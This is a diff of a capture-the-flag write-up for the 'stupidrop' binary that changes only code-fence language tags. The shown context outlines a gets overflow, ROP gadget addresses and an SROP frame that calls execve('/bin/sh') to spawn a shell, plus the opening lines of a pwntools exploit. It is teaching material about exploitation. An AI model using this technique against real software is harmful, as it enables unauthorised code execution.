@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file stupidrop
 stupidrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f0ff8340bc3eead42d0f7b14535ee7c74a6ca7d, not stripped
 $    pwn checksec stupidrop
@@ -22,7 +22,7 @@ So we can see that we are dealing with a `64` bit dynamically linked binary, wit
 
 Looking at the main function, we can see an obvious bug:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -41,7 +41,7 @@ So it uses `gets`, which gives us a buffer overflow (when we check the offset, w
 
 So for our exploit, we will be using an SROP attack to jump to a syscall, and make an `execve("/bin/sh", NULL, NULL)` call. To do that, we will need to write `/bin/sh\x00` somewhere to memory, at an address we know. Looking at the bss in Ghidra, we see that `0x601050` would probably be a good candidate. This is because it doesn't look like anything is stored there that would mess with what we are doing, we know it's address (thanks to no PIE), and that it is in a memory region that we can read and write to:
 
-```
+```nasm
         00601050 00              undefined1 00h
         00601051 00              ??         00h
         00601052 00              ??         00h
@@ -55,7 +55,7 @@ So for our exploit, we will be using an SROP attack to jump to a syscall, and ma
 Now for how to write `/bin/sh\x00` to `0x601050`, we will call `gets`. The function `gets` is imported (we can see it under the list of imports in Ghidra), and since PIE isn't enabled we know it's address. So we will just call `gets` with `0x601050` as an argument (which we have the rop gadgets for), and write `/bin/sh\x00` to `0x601050`.
 
 Getting the rop gadget:
-```
+```console
 $ python ROPgadget.py --binary stupidrop | grep "pop rdi"
 0x00000000004006a3 : pop rdi ; ret
 ```
@@ -70,14 +70,14 @@ The `alarm` function is used to specify how many seconds to wait before generati
 
 Now that we have `rax` set to `0xf`, space on the stack to store our sigreturn frame, and we have a syscall rop gadget:
 
-```
+```console
 $ python ROPgadget.py --binary stupidrop | grep syscall
 0x000000000040063e : syscall
 ```
 
 So we have everything we need to make the sigreturn. So we have control over all of the registers. Since we have the syscall rop gadget and a pointer to `/bin/sh`, we can make the `execve("/bin/sh", NULL, NULL)` call. In order to get that, we will have the following registers set accordingly:
 
-```
+```nasm
 rip:  0x40063e (address of syscall rop gadget)
 rax:  0x3b (specify execve syscall)
 rdi:  0x601050 (pointer to "/bin/sh")
@@ -91,7 +91,7 @@ That syscall will pop a shell for us. We will just store the frame right after t
 
 Putting it all together, we get the following exploit:
 
-```
+```python
 from pwn import *
 
 # Establish the target
@@ -161,7 +161,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $ python exploit.py
 [+] Starting local process './stupidrop': pid 10520
 [*] running in new terminal: /usr/bin/gdb -q  "./stupidrop" 10520 -x "/tmp/pwnyQjXEX.gdb"
